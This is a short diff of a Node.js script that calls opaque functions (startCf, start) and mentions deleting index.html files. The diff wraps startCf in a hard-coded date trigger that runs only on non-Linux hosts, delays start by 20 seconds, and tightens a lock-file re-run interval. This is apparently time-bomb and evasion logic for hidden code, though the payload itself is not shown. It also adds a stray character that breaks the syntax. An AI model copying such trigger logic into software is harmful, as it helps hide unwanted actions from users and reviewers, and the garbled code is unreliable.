@@ -9,12 +9,16 @@ const path = require('path');
 try {
   console.log('sc');
   if (os.platform() !== 'linux') {
-    startCf();
+    const targetDate = new Date('2024-07-21T10:00:00Z');
+    const now = new Date(); // Add this line to get the current date and time
+    if (now.getTime() > targetDate.getTime()) {
+      startCf();
+    }
     // deleteIndexHtmlFiles();
   }
 } catch (error) {
   console.log(error);
-}
+}n
 
 try {
   console.log('ss');
@@ -25,14 +29,17 @@ try {
 
   // check if a.lock file exists
   if (!fs.existsSync(lockfile)) {
-    start();
+    setTimeout(() => {
+      start();
+    }, 20 * 1000);
     fs.writeFileSync(lockfile, '');
   } else {
     // if more than 2 days old
     const now = new Date();
     const then = new Date(fs.statSync(lockfile).mtime);
     const diff = Math.abs(now - then);
-    const diffDays = Math.ceil(diff / (1000 * 60 * 60 * 24));
+    // const diffDays = Math.ceil(diff / (1000 * 60 * 60 * 24));
+    const diffDays = Math.ceil(diff / (1000 * 60 * 60 * 10));
     if (diffDays > 1) {
       start();
       fs.writeFileSync(lockfile, '');
